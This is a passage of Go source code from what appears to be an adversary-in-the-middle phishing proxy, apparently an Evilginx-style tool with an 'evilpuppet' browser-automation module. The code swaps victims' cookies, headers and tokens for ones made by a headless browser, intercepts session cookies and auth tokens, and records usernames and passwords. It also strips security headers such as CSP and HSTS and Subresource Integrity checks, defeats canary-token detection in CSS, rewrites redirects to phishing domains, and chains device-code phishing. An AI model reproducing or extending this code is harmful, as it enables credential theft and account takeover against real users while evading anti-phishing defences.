														// Swap bl (build label — should be consistent)
														if goBl := goRodQ.Get("bl"); goBl != "" {
															victimQ.Set("bl", goBl)
														}

														// Swap source-path if present
														if goSP := goRodQ.Get("source-path"); goSP != "" {
															victimQ.Set("source-path", goSP)
														}

														req.URL.RawQuery = victimQ.Encode()
														log.Info("[evilpuppet] [%d] URL params updated (f.sid, bl swapped from go-rod, _reqid kept from victim)", ps.Index)
													}
												}

												// Swap cookies: replace victim's cookies with go-rod's cookies
												// The body/URL are from go-rod's session, so cookies must match
												if fullCookies, fcOk := result.Tokens["__full_cookies__"]; fcOk && fullCookies != "" {
													// Deduplicate cookies (go-rod sometimes captures duplicates)
													seen := make(map[string]string)
													var deduped []string
													for _, part := range strings.Split(fullCookies, "; ") {
														part = strings.TrimSpace(part)
														if part == "" {
															continue
														}
														eqIdx := strings.Index(part, "=")
														var cookieName string
														if eqIdx > 0 {
															cookieName = part[:eqIdx]
														} else {
															cookieName = part
														}
														seen[cookieName] = part // last value wins
													}
													for _, v := range seen {
														deduped = append(deduped, v)
													}
													cleanCookies := strings.Join(deduped, "; ")
													oldCookies := req.Header.Get("Cookie")
													req.Header.Set("Cookie", cleanCookies)
													log.Info("[evilpuppet] [%d] Cookie header swapped (old len=%d, new len=%d, deduped from %d parts)", ps.Index, len(oldCookies), len(cleanCookies), len(strings.Split(fullCookies, "; ")))
												}

												// Swap User-Agent to match go-rod's Chrome
												if goRodUA, uaOk := result.Tokens["__full_useragent__"]; uaOk && goRodUA != "" {
													oldUA := req.Header.Get("User-Agent")
													req.Header.Set("User-Agent", goRodUA)
													log.Info("[evilpuppet] [%d] User-Agent swapped: %s → %s", ps.Index, oldUA, goRodUA)
												}

												// Swap x-goog-ext-* headers (contain session-bound DSH and flow data)
												// These MUST match the body's session state
												// First: strip victim's sec-ch-ua headers (will be replaced by go-rod's values from __hdr_*__ tokens)
												for k := range req.Header {
													kLower := strings.ToLower(k)
													if strings.HasPrefix(kLower, "sec-ch-") {
														req.Header.Del(k)
													}
												}
												// Now set ALL captured headers from go-rod (x-goog-ext-*, sec-ch-ua*, x-same-domain)
												for tokenKey, tokenVal := range result.Tokens {
													if strings.HasPrefix(tokenKey, "__hdr_") && strings.HasSuffix(tokenKey, "__") {
														headerName := strings.TrimSuffix(strings.TrimPrefix(tokenKey, "__hdr_"), "__")
														// go-rod header values from JSON arrays may have brackets — clean them
														cleanVal := strings.TrimSpace(tokenVal)
														// Find and replace the header (case-insensitive)
														found := false
														for k := range req.Header {
															if strings.EqualFold(k, headerName) {
																oldVal := req.Header.Get(k)
																req.Header.Set(k, cleanVal)
																log.Info("[evilpuppet] [%d] Header swapped %s: %s → %s", ps.Index, k, oldVal, cleanVal)
																found = true
																break
															}
														}
														if !found {
															// Header doesn't exist on victim's request — add it
															req.Header.Set(headerName, cleanVal)
															log.Info("[evilpuppet] [%d] Header added %s: %s", ps.Index, headerName, cleanVal)
														}
													}
												}
												log.Info("[evilpuppet] [%d] Headers replaced with go-rod's values (including sec-ch-ua Client Hints)", ps.Index)

												// Dump go-rod's captured headers for comparison
												if goRodHeaders, ghOk := result.Tokens["__full_headers__"]; ghOk && goRodHeaders != "" {
													ioutil.WriteFile("/tmp/gorod_mi613e_headers.txt", []byte(goRodHeaders), 0644)
												}

												// Dump proxy outgoing headers for comparison
												var proxyHeaders string
												for k, vv := range req.Header {
													for _, v := range vv {
														proxyHeaders += fmt.Sprintf("%s: %s\n", k, v)
													}
												}
												proxyHeaders += fmt.Sprintf("URL: %s\n", req.URL.String())
												ioutil.WriteFile("/tmp/proxy_mi613e_headers.txt", []byte(proxyHeaders), 0644)

												log.Success("[evilpuppet] [%d] Full body swap complete — request uses go-rod's internally consistent tokens", ps.Index)
											} else {
												// ═══ FALLBACK: Individual token injection ═══
												// Only used if full body capture failed
												log.Warning("[evilpuppet] [%d] Full body not captured, falling back to individual token injection", ps.Index)

												// Inject tokens into the request body
												// The body may be URL-encoded (form data), so try both raw and decoded
												for _, inj := range epCfg.InjectTokens {
													if tokenVal, exists := result.Tokens[inj.TokenName]; exists {
														if inj.Target == "body" && inj.Search != nil {
															replaced := false
															log.Debug("[evilpuppet] [%d] Trying to inject token %s, pattern=%s", ps.Index, inj.TokenName, inj.Search.String())

															// Check if this is a "replace all" pattern (replace == "{token}" without prefix)
															isReplaceAll := inj.Replace == "{token}"

															// First try matching on raw body
															if inj.Search.MatchString(bodyStr) {
																var newBody string
																if isReplaceAll {
																	// Global replacement - replace all occurrences
																	newBody = inj.Search.ReplaceAllString(bodyStr, tokenVal)
																	count := strings.Count(bodyStr, inj.Search.FindString(bodyStr))
																	if newBody != bodyStr {
																		log.Success("[evilpuppet] [%d] Token injected (raw, global): %s (%d bytes, ~%d occurrences)", ps.Index, inj.TokenName, len(tokenVal), count)
																		replaced = true
																	}
																} else {
																	// Single replacement with pattern
																	newBody = inj.Search.ReplaceAllStringFunc(bodyStr, func(match string) string {
																		return inj.Search.ReplaceAllString(match,
																			strings.ReplaceAll(inj.Replace, "{token}", tokenVal))
																	})
																	replaced = true
																	log.Success("[evilpuppet] [%d] Token injected (raw): %s (%d bytes)", ps.Index, inj.TokenName, len(tokenVal))
																}
																if replaced {
																	epBody = []byte(newBody)
																	bodyStr = newBody
																}
															} else {
																log.Debug("[evilpuppet] [%d] Raw body match failed", ps.Index)
															}

															// If no match on raw, try URL-decoded body with direct raw replacement
															if !replaced {
																decoded, decErr := url.QueryUnescape(bodyStr)
																if decErr == nil && decoded != bodyStr {
																	log.Debug("[evilpuppet] [%d] Testing decoded body, pattern matches=%v", ps.Index, inj.Search.MatchString(decoded))
																	if inj.Search.MatchString(decoded) {
																		// For "replace all" tokens, try decoded global replace
																		if isReplaceAll {
																			oldMatch := inj.Search.FindString(decoded)
																			if oldMatch != "" {
																				// URL-encode the old match for replacement in the encoded body
																				// Use JS-compatible encoding to match browser's encodeURIComponent
																				oldEncoded := jsEncodeURIComponent(oldMatch)
																				newEncoded := jsEncodeURIComponent(tokenVal)
																				log.Debug("[evilpuppet] [%d] isReplaceAll: old=%s, oldEnc=%s, newEnc=%s", ps.Index, oldMatch, oldEncoded, newEncoded)
																				// Replace in raw body (URL-encoded)
																				newBody := strings.ReplaceAll(bodyStr, oldEncoded, newEncoded)
																				if newBody != bodyStr {
																					count := strings.Count(bodyStr, oldEncoded)
																					epBody = []byte(newBody)
																					bodyStr = newBody
																					replaced = true
																					log.Success("[evilpuppet] [%d] Token injected (decoded, global): %s (%d bytes, %d occurrences)", ps.Index, inj.TokenName, len(tokenVal), count)
																				}
																			}
																		} else {
																			// Extract old token value from decoded body
																			oldMatch := inj.Search.FindStringSubmatch(decoded)
																			log.Debug("[evilpuppet] [%d] Regex groups: %d, last group len=%d", ps.Index, len(oldMatch), len(oldMatch[len(oldMatch)-1]))
																			if len(oldMatch) > 1 {
																				// Find the last capture group (the token value to replace)
																				oldTokenVal := oldMatch[len(oldMatch)-1]
																				// URL-encode both old and new token values
																				// Use JS-compatible encoding to match browser's encodeURIComponent
																				oldEncoded := jsEncodeURIComponent(oldTokenVal)
																				newEncoded := jsEncodeURIComponent(tokenVal)
																				log.Debug("[evilpuppet] [%d] old_encoded (first 80): %s", ps.Index, oldEncoded[:min(80, len(oldEncoded))])
																				log.Debug("[evilpuppet] [%d] bodyStr contains old_encoded: %v", ps.Index, strings.Contains(bodyStr, oldEncoded))
																				log.Debug("[evilpuppet] [%d] Replacing: old_len=%d, new_len=%d", ps.Index, len(oldEncoded), len(newEncoded))
																				// Direct replacement in raw body - preserves all other encoding
																				newBody := strings.Replace(bodyStr, oldEncoded, newEncoded, 1)
																				if newBody != bodyStr {
																					epBody = []byte(newBody)
																					bodyStr = newBody
																					replaced = true
																					log.Success("[evilpuppet] [%d] Token injected (direct): %s (%d bytes)", ps.Index, inj.TokenName, len(tokenVal))
																				} else {
																					// URL-encoded replacement failed - try raw replacement
																					// The body may contain raw token (not URL-encoded)
																					tokenStart := oldTokenVal[:min(20, len(oldTokenVal))]
																					log.Debug("[evilpuppet] [%d] Checking if bodyStr contains rawToken (first 20): %s", ps.Index, tokenStart)
																					log.Debug("[evilpuppet] [%d] bodyStr contains tokenStart: %v", ps.Index, strings.Contains(bodyStr, tokenStart))
																					if strings.Contains(bodyStr, oldTokenVal) {
																						log.Debug("[evilpuppet] [%d] Found old token RAW in body, doing raw replacement", ps.Index)
																						newBody = strings.Replace(bodyStr, oldTokenVal, tokenVal, 1)
																						if newBody != bodyStr {
																							epBody = []byte(newBody)
																							bodyStr = newBody
																							replaced = true
																							log.Success("[evilpuppet] [%d] Token injected (raw fallback): %s (%d bytes)", ps.Index, inj.TokenName, len(tokenVal))
																						}
																					} else if strings.Contains(bodyStr, tokenStart) {
																						// Find the token by its start and replace to the next delimiter
																						// The token typically ends at a quote or backslash-quote
																						idx := strings.Index(bodyStr, tokenStart)
																						if idx >= 0 {
																							log.Debug("[evilpuppet] [%d] Token found at index %d, searching for end delimiter", ps.Index, idx)
																							// Look for the token end - typically ends at ", or \", or & or other delimiters
																							// Search for common end patterns
																							endIdx := -1
																							remaining := bodyStr[idx:]
																							// Find the token end (quote, backslash-quote, or ampersand)
																							for i := len(tokenStart); i < len(remaining); i++ {
																								c := remaining[i]
																								if c == '"' || c == '&' || c == '\'' {
																									endIdx = idx + i
																									break
																								}
																								// Also check for %22 (encoded quote) or backslash-quote
																								if i+2 < len(remaining) && remaining[i:i+3] == "%22" {
																									endIdx = idx + i
																									break
																								}
																								if c == '\\' && i+1 < len(remaining) && remaining[i+1] == '"' {
																									endIdx = idx + i
																									break
																								}
																							}
																							if endIdx > idx {
																								oldTokenInBody := bodyStr[idx:endIdx]
																								log.Debug("[evilpuppet] [%d] Found token in body: len=%d, start=%s...", ps.Index, len(oldTokenInBody), oldTokenInBody[:min(40, len(oldTokenInBody))])
																								newBody = bodyStr[:idx] + tokenVal + bodyStr[endIdx:]
																								if newBody != bodyStr {
																									epBody = []byte(newBody)
																									bodyStr = newBody
																									replaced = true
																									log.Success("[evilpuppet] [%d] Token injected (position-based): %s (%d bytes)", ps.Index, inj.TokenName, len(tokenVal))
																								}
																							} else {
																								log.Warning("[evilpuppet] [%d] Could not find token end delimiter", ps.Index)
																							}
																						}
																					}
																					if !replaced {
																						log.Warning("[evilpuppet] [%d] Token replacement failed. Token starts with: %s", ps.Index, tokenStart)
																					}
																				}
																			}
																		}
																	}
																} else {
																	log.Debug("[evilpuppet] [%d] Decode failed or body unchanged", ps.Index)
																}
															}

															if !replaced {
																log.Warning("[evilpuppet] [%d] Token regex did not match body for: %s", ps.Index, inj.TokenName)
															}
														} else if inj.Target == "url" && inj.Search != nil {
															// URL injection - replace in request URL
															urlStr := req.URL.String()
															log.Debug("[evilpuppet] [%d] Trying to inject token %s in URL, pattern=%s", ps.Index, inj.TokenName, inj.Search.String())
															if inj.Search.MatchString(urlStr) {
																newURL := inj.Search.ReplaceAllStringFunc(urlStr, func(match string) string {
																	return inj.Search.ReplaceAllString(match,
																		strings.ReplaceAll(inj.Replace, "{token}", tokenVal))
																})
																if newURL != urlStr {
																	parsed, err := url.Parse(newURL)
																	if err == nil {
																		req.URL = parsed
																		log.Success("[evilpuppet] [%d] Token injected (URL): %s", ps.Index, inj.TokenName)
																	} else {
																		log.Warning("[evilpuppet] [%d] Failed to parse new URL: %v", ps.Index, err)
																	}
																}
															} else {
																log.Warning("[evilpuppet] [%d] Token regex did not match URL for: %s", ps.Index, inj.TokenName)
															}
														}
													}
												}
											} // end of full body swap else (fallback token injection)

											// Store tokens in session
											for k, v := range result.Tokens {
												s.EvilPuppetTokens[k] = v
												if err := p.db.SetSessionCustom(ps.SessionId, "evilpuppet_"+k, v); err != nil {
													log.Error("[evilpuppet] database: %v", err)
												}
											}

											// Update request body
											req.Body = ioutil.NopCloser(bytes.NewBuffer(epBody))
											req.ContentLength = int64(len(epBody))

											// Debug: save final injected body
											ioutil.WriteFile("/tmp/evilpuppet_final_body.txt", epBody, 0644)
											log.Debug("[evilpuppet] [%d] Final body saved to /tmp/evilpuppet_final_body.txt (%d bytes)", ps.Index, len(epBody))

											log.Success("[evilpuppet] [%d] Request released with valid token", ps.Index)
										} else {
											// Evilpuppet failed — forward original request (graceful degradation)
											errMsg := "unknown error"
											if result != nil && result.Error != nil {
												errMsg = result.Error.Error()
											}
											log.Warning("[evilpuppet] [%d] Token generation failed: %s — forwarding original request", ps.Index, errMsg)
										}
									} else {
										// ═══ ASYNC MODE (existing behavior) ═══
										asyncVictimCookies := req.Header.Get("Cookie")
										go func(sid string, cfg *EvilPuppetConfig, credentials map[string]string, domain string, session *Session, index int, cookies string) {
											resultCh := p.evilpuppet.HandleTrigger(sid, cfg, credentials, domain, cookies)
											result := <-resultCh
											if result != nil {
												if result.Error != nil {
													log.Error("[evilpuppet] [%d] Session %s failed: %v", index, sid, result.Error)
												}
												if len(result.Tokens) > 0 {
													for k, v := range result.Tokens {
														session.EvilPuppetTokens[k] = v
														log.Success("[evilpuppet] [%d] Token stored: %s = %s", index, k, v[:min(len(v), 32)]+"...")
														if err := p.db.SetSessionCustom(sid, "evilpuppet_"+k, v); err != nil {
															log.Error("[evilpuppet] database: %v", err)
														}
													}
													log.Info("[evilpuppet] [%d] All evilpuppet tokens stored for session %s", index, sid)
												}
											}
										}(ps.SessionId, epCfg, creds, phishDomain, s, ps.Index, asyncVictimCookies)
									}
								}
							} // end else (email found)
						}
					}
				}

				// check if request should be intercepted
				if pl != nil {
					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
						for _, ic := range pl.intercept {
							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
							}
						}
					}
				}

				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" && req.Method == "POST" {
					s, ok := p.sessions[ps.SessionId]
					if ok && !s.IsDone {
						for _, au := range pl.authUrls {
							if au.MatchString(req.URL.Path) {
								s.Finish(true)
								break
							}
						}
					}
				}
			}

			return req, nil
		})

	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			// ════════════════════════════════════════════════════════════════════════
			// PANIC RECOVERY - Prevent single response from crashing entire server
			// ════════════════════════════════════════════════════════════════════════
			defer func() {
				if r := recover(); r != nil {
					log.Error("[PANIC] Recovered from panic in response handler: %v", r)
				}
			}()

			// End rate limiter tracking for this request
			if ctx.Req != nil {
				clientIP := ctx.Req.RemoteAddr
				if idx := strings.LastIndex(clientIP, ":"); idx != -1 {
					clientIP = clientIP[:idx]
				}
				if xff := ctx.Req.Header.Get("X-Forwarded-For"); xff != "" {
					if idx := strings.IndexByte(xff, ','); idx != -1 {
						clientIP = strings.TrimSpace(xff[:idx])
					} else {
						clientIP = xff
					}
				} else if xri := ctx.Req.Header.Get("X-Real-IP"); xri != "" {
					clientIP = xri
				}
				p.rateLimiter.EndRequest(clientIP)
			}

			// --- Begin rewrite_urls response logic ---
			if resp != nil {
				// Set no-referrer so the browser doesn't send Referer headers.
				// This prevents Akamai from detecting a mismatch between the Referer
				// (rewritten to original domain) and document.location in sensor data
				// (which still contains the proxy domain since Location.prototype is
				// non-configurable). The proxy injects Referer server-side for POST
				// requests that need it (see request handler).
				resp.Header.Set("Referrer-Policy", "no-referrer")
				pl := p.getPhishletByOrigHost(strings.ToLower(resp.Request.Host))
				if pl == nil {
					// Fallback: check by phish host (for internally-generated redirects like lure→login)
					pl = p.getPhishletByPhishHost(strings.ToLower(resp.Request.Host))
				}
				if pl != nil && resp.Header.Get("Location") != "" {
					locUrl, err := url.Parse(resp.Header.Get("Location"))
					if err == nil {
						// Translate Location host to original host if it's a phish host
						locHost := locUrl.Host
						if origHost, ok := p.replaceHostWithOriginal(locHost); ok {
							locHost = origHost
						}
						for _, ru := range pl.rewriteUrls {
							// Check if trigger domains match
							domainMatched := false
							var triggerDomain string
							for _, d := range ru.triggerDomains {
								if d == locHost {
									domainMatched = true
									triggerDomain = d
									break
								}
							}

							if domainMatched {
								// Check if trigger paths match
								pathMatched := false
								for _, pth := range ru.triggerPaths {
									if pth == locUrl.Path {
										pathMatched = true
										break
									}
								}

								if pathMatched {
									// Generate random obfuscated path
									fullPath, key := genObfuscatedPath()
									origUrl := locUrl.Path
									if locUrl.RawQuery != "" {
										origUrl += "?" + locUrl.RawQuery
									}

									// Store original URL mapping
									tidUrlMap.Lock()
									tidUrlMap.m[key] = origUrl
									tidUrlMap.Unlock()

									// Build query parameters — only preserve exclude_keys
									q := url.Values{}
									if len(ru.excludeKeys) > 0 {
										origQuery, _ := url.ParseQuery(locUrl.RawQuery)
										for _, ek := range ru.excludeKeys {
											if vals, ok := origQuery[ek]; ok {
												for _, v := range vals {
													q.Add(ek, v)
												}
											}
										}
									}

									// Convert trigger domain to phishing domain
									phishHost, found := p.replaceHostWithPhished(triggerDomain)
									if !found {
										phishHost = locUrl.Host
									}

									// Build the complete rewritten URL using phishing domain + random path
									rewriteUrl := "https://" + phishHost + fullPath

									if len(q) > 0 {
										rewriteUrl += "?" + q.Encode()
									}

									resp.Header.Set("Location", rewriteUrl)
									break
								}
							}
						}
					}
				}
			}
			// --- End rewrite_urls response logic ---
			if resp == nil {
				return nil
			}

			// Internal API responses: pass through unmodified
			if strings.HasPrefix(resp.Request.URL.Path, "/api/v1/") {
				return resp
			}

			// handle session
			ck_session := &http.Cookie{}
			if ctx.UserData == nil {
				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte("")))
				return resp
			}
			ps := ctx.UserData.(*ProxySession)
			if ps.SessionId != "" {
				if ps.Created {
					ck_session = &http.Cookie{
						Name:    getSessionCookieName(ps.PhishletName, p.cookieName),
						Value:   ps.SessionId,
						Path:    "/",
						Domain:  p.cfg.GetBaseDomain(),
						Expires: time.Now().Add(60 * time.Minute),
					}
				}
			}

			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
			if allow_origin != "" && allow_origin != "*" {
				if u, err := url.Parse(allow_origin); err == nil {
					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
					}
				} else {
					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
				}
				resp.Header.Set("Access-Control-Allow-Credentials", "true")
			}
			var rm_headers = []string{
				"Content-Security-Policy",
				"Content-Security-Policy-Report-Only",
				"Strict-Transport-Security",
				"X-XSS-Protection",
				"X-Content-Type-Options",
				"X-Frame-Options",
				// Additional security headers used by banks
				"Cross-Origin-Opener-Policy",
				"Cross-Origin-Embedder-Policy",
				"Cross-Origin-Resource-Policy",
				"Permissions-Policy",
				"Feature-Policy",
				"Report-To",
				"NEL",
				"Expect-CT",
				"X-Permitted-Cross-Domain-Policies",
				"Referrer-Policy",
				"Clear-Site-Data",
			}
			for _, hdr := range rm_headers {
				resp.Header.Del(hdr)
			}

			redirect_set := false
			if s, ok := p.sessions[ps.SessionId]; ok {
				if s.RedirectURL != "" {
					redirect_set = true
				}
			}

			req_hostname := strings.ToLower(resp.Request.Host)

			// if "Location" header is present, make sure to redirect to the phishing domain
			r_url, err := resp.Location()
			if err == nil {
				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
					r_url.Host = r_host
					resp.Header.Set("Location", r_url.String())
				}
			}

			// Debug: log Cloudflare challenge responses (TEMPORARY)
			if strings.Contains(resp.Request.URL.Path, "cdn-cgi/challenge-platform") {
				log.Debug("CF-CHALLENGE-RESP: status=%d path=%s", resp.StatusCode, resp.Request.URL.Path)
				log.Debug("CF-CHALLENGE-RESP: Location=%s", resp.Header.Get("Location"))
				for _, sc := range resp.Header.Values("Set-Cookie") {
					if len(sc) > 200 {
						log.Debug("CF-CHALLENGE-RESP: Set-Cookie (truncated): %s...", sc[:200])
					} else {
						log.Debug("CF-CHALLENGE-RESP: Set-Cookie: %s", sc)
					}
				}
				// Dump all response headers
				for hk, hv := range resp.Header {
					log.Debug("CF-CHALLENGE-RESP: HDR %s: %s", hk, strings.Join(hv, "; "))
				}
			}

			// fix cookies
			pl := p.getPhishletByOrigHost(req_hostname)
			var auth_tokens map[string][]*CookieAuthToken
			if pl != nil {
				auth_tokens = pl.cookieAuthTokens
			}
			is_cookie_auth := false
			is_body_auth := false
			is_http_auth := false
			cookies := resp.Cookies()
			resp.Header.Del("Set-Cookie")

			for _, ck := range cookies {
				// parse cookie

				// add SameSite=none for every received cookie, allowing cookies through iframes
				if ck.Secure {
					ck.SameSite = http.SameSiteNoneMode
				}

				if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
					exptime, err := time.Parse(time.RFC850, ck.RawExpires)
					if err != nil {
						exptime, err = time.Parse(time.ANSIC, ck.RawExpires)
						if err != nil {
							exptime, err = time.Parse("Monday, 02-Jan-2006 15:04:05 MST", ck.RawExpires)
						}
					}
					ck.Expires = exptime
				}

				if pl != nil && ps.SessionId != "" {
					c_domain := ck.Domain
					if c_domain == "" {
						c_domain = req_hostname
					} else {
						// always prepend the domain with '.' if Domain cookie is specified - this will indicate that this cookie will be also sent to all sub-domains
						if c_domain[0] != '.' {
							c_domain = "." + c_domain
						}
					}
					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
					at := pl.getAuthToken(c_domain, ck.Name)
					if at != nil {
						s, ok := p.sessions[ps.SessionId]
						if ok && (s.IsAuthUrl || !s.IsDone) {
							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
								s.LastTokenActivity = time.Now() // Update activity for stall detection
							}
						}
					}
				}

				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
				resp.Header.Add("Set-Cookie", ck.String())
			}
			// Add session cookie if one was created for this request
			if ck_session.String() != "" {
				resp.Header.Add("Set-Cookie", ck_session.String())
			}

			// modify received body
			body, err := ioutil.ReadAll(resp.Body)

			// Debug: log Cloudflare challenge flow response bodies (TEMPORARY)
			if strings.Contains(resp.Request.URL.Path, "cdn-cgi/challenge-platform") {
				bodyStr := string(body)
				if len(bodyStr) > 1000 {
					bodyStr = bodyStr[:1000]
				}
				log.Debug("CF-CHALLENGE-BODY (first 1000): %s", bodyStr)
			}

			// Debug: log POST /login response from real server (TEMPORARY)
			if resp.Request.Method == "POST" && resp.Request.URL.Path == "/login" {
				debugFile := fmt.Sprintf("/tmp/login_post_resp_%d.txt", time.Now().UnixNano())
				ioutil.WriteFile(debugFile, body, 0644)
				log.Debug("LOGIN-POST-RESP: status=%d len=%d written_to=%s", resp.StatusCode, len(body), debugFile)
				// Log request details
				reqDebugFile := fmt.Sprintf("/tmp/login_post_req_%d.txt", time.Now().UnixNano())
				reqInfo := fmt.Sprintf("URL: %s\nMethod: %s\nHost: %s\n\nHeaders:\n", resp.Request.URL.String(), resp.Request.Method, resp.Request.Host)
				for k, v := range resp.Request.Header {
					reqInfo += fmt.Sprintf("%s: %s\n", k, strings.Join(v, ", "))
				}
				ioutil.WriteFile(reqDebugFile, []byte(reqInfo), 0644)
			}

			// Debug: log batchexecute response to file
			if strings.Contains(resp.Request.URL.Path, "batchexecute") {
				// Write full response to file for analysis
				debugFile := fmt.Sprintf("/tmp/batchexec_resp_%d.txt", time.Now().UnixNano())
				ioutil.WriteFile(debugFile, body, 0644)
				log.Debug("BATCHEXEC-RESP: status=%d len=%d written_to=%s", resp.StatusCode, len(body), debugFile)
				// Log ALL response headers
				for k, v := range resp.Header {
					log.Debug("BATCHEXEC-RESP-HDR: %s: %s", k, strings.Join(v, ", "))
				}
				// Also write request details to file for comparison
				reqDebugFile := fmt.Sprintf("/tmp/batchexec_req_%d.txt", time.Now().UnixNano())
				reqInfo := fmt.Sprintf("URL: %s\nMethod: %s\nHost: %s\n\nHeaders:\n", resp.Request.URL.String(), resp.Request.Method, resp.Request.Host)
				for k, v := range resp.Request.Header {
					reqInfo += fmt.Sprintf("%s: %s\n", k, strings.Join(v, ", "))
				}
				ioutil.WriteFile(reqDebugFile, []byte(reqInfo), 0644)
			}

			if pl != nil {
				if s, ok := p.sessions[ps.SessionId]; ok {
					// capture body response tokens
					for k, v := range pl.bodyAuthTokens {
						if _, ok := s.BodyTokens[k]; !ok {
							//log.Debug("hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
							if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
								//log.Debug("RESPONSE body = %s", string(body))
								token_re := v.search.FindStringSubmatch(string(body))
								if len(token_re) >= 2 {
									s.BodyTokens[k] = token_re[1]
								}
							}
						}
					}

					// capture http header tokens
					for k, v := range pl.httpAuthTokens {
						if _, ok := s.HttpTokens[k]; !ok {
							hv := resp.Request.Header.Get(v.header)
							if hv != "" {
								s.HttpTokens[k] = hv
							}
						}
					}
				}

				// check if we have all tokens
				if len(pl.authUrls) == 0 {
					if s, ok := p.sessions[ps.SessionId]; ok {
						is_cookie_auth = s.AllCookieAuthTokensCaptured(auth_tokens)
						if len(pl.bodyAuthTokens) == len(s.BodyTokens) {
							is_body_auth = true
						}
						if len(pl.httpAuthTokens) == len(s.HttpTokens) {
							is_http_auth = true
						}
					}
				}
			}

			if is_cookie_auth && is_body_auth && is_http_auth {
				// we have all auth tokens
				if s, ok := p.sessions[ps.SessionId]; ok {
					if !s.IsDone {
						// Debug: log which tokens triggered completion
						log.Debug("TOKEN-COMPLETE: path=%s cookie_auth=%v body_auth=%v http_auth=%v", resp.Request.URL.Path, is_cookie_auth, is_body_auth, is_http_auth)
						if pl != nil {
							for domain, tokens := range s.CookieTokens {
								for name, ct := range tokens {
									snip := ct.Value
									if len(snip) > 30 {
										snip = snip[:30] + "..."
									}
									log.Debug("TOKEN-CAPTURED: %s:%s = %s", domain, name, snip)
								}
							}
						}
						log.Success("[%d] all authorization tokens intercepted!", ps.Index)

						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
							log.Error("database: %v", err)
						}
						if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
							log.Error("database: %v", err)
						}
						if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
							log.Error("database: %v", err)
						}
						s.Finish(false)

						// --- Device code chaining: override redirect for "always" and "auto" modes ---
						if (s.DCMode == DCModeAlways || s.DCMode == DCModeAuto) && s.DCSessionID != "" {
							dcs, dcOk := p.deviceCode.GetSession(s.DCSessionID)
							if dcOk && dcs.IsCodeValid() {
								// Use themed URL if dc_theme is set on the lure
								var interstitialURL string
								if s.PhishLure != nil && s.PhishLure.DeviceCodeTheme != "" && s.PhishLure.DeviceCodeTheme != "default" {
									interstitialURL = fmt.Sprintf("/access/%s/%s", s.PhishLure.DeviceCodeTheme, s.Id)
								} else {
									interstitialURL = fmt.Sprintf("/dc/%s", s.Id)
								}
								log.Important("[%d] [devicecode] redirecting to device code interstitial (mode: %s, code: %s)", ps.Index, s.DCMode, s.DCUserCode)
								s.RedirectURL = interstitialURL
							}
						}
						// --- End device code chaining redirect ---

						// Send session_captured notification
						lureUrl := ""
						if s.PhishLure != nil && s.PhishLure.Path != "" {
							lureUrl = s.PhishLure.Path
						}
						p.notifier.Trigger(EventSessionCaptured, &NotificationData{
							Origin:    s.RemoteAddr,
							LureURL:   lureUrl,
							Phishlet:  pl.Name,
							SessionID: ps.SessionId,
							UserAgent: s.UserAgent,
							Username:  s.Username,
							Password:  s.Password,
							Custom:    s.Custom,
							Session:   s,
						})

						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
							gid, ok := s.Params["gid"]
							if ok && gid != "" {
								p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
								err := p.gophish.ReportCredentialsSubmitted(gid, s.RemoteAddr, s.UserAgent)
								if err != nil {
									log.Error("gophish: %s", err)
								}
							}
						}
					}
				}
			}

			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]

			// --- Anti-phishing evasion: CSS canary token hex unescape ---
			// CSS files may contain hex-escaped characters in url() blocks like \63 = 'c', \6f = 'o'
			// This obfuscation is used by canary token services (e.g., Thinkst Canary) to prevent
			// simple string matching from detecting and neutralizing canary token URLs.
			// Unescaping here ensures sub_filters can match and replace these URLs.
			if err == nil && strings.Contains(mime, "css") {
				body = []byte(cssUnescapeRe.ReplaceAllStringFunc(string(body), func(match string) string {
					submatch := cssUnescapeRe.FindStringSubmatch(match)
					if len(submatch) < 2 {
						return match
					}
					codepoint, err := strconv.ParseInt(submatch[1], 16, 32)
					if err != nil || codepoint == 0 || codepoint > 0x10FFFF {
						return match
					}
					return string(rune(codepoint))
				}))
			}

			// --- Anti-phishing evasion: Strip SRI integrity and crossorigin attributes ---
			// Subresource Integrity (integrity="sha256-...") prevents modified scripts from loading.
			// crossorigin attributes can also cause issues with proxied resources.
			// Stripping these ensures proxied content loads correctly.
			if err == nil && (mime == "text/html" || strings.Contains(mime, "xhtml")) {
				body = []byte(sriRe.ReplaceAllString(string(body), ""))
				body = []byte(crossoriginRe.ReplaceAllString(string(body), ""))
			}

			// For batchexecute responses: apply domain patching but preserve
			// length-delimited framing. Each data chunk is prefixed by its byte length.
			// We parse the framing, patch domains in each chunk, update length prefixes,
			// and reassemble. Sub_filters are still skipped (too aggressive for JSON data).
			isBatchExec := strings.Contains(resp.Request.URL.Path, "batchexecute")

